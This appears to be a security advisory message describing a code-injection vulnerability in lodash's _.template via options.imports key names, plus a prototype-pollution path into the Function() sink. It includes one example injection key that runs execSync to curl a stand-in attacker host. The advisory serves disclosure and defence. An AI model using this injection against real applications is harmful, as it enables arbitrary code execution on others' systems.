extra.message: Affected versions of lodash, lodash-amd, lodash-es, and lodash.template are vulnerable to Improper Control of Generation of Code ('Code Injection'). The fix for CVE-2021-23337 added validation for the variable option in _.template but did not apply the same validation to options.imports key names. Both paths flow into the same Function() constructor sink. When an application passes untrusted input as options.imports key names, an attacker can inject default-parameter expressions — for example, a key such as x=process.getBuiltinModule("child_process").execSync("curl attacker.com") — that execute arbitrary code at template compile time. Additionally, _.template uses assignInWith to merge imports, which enumerates inherited properties via for..in; if Object.prototype has been polluted by any prior gadget, the polluted keys are silently absorbed into the imports object and passed to Function(). NOTE: The package `lodash.template` has been depreacted and the author suggested to use `eta` instead.
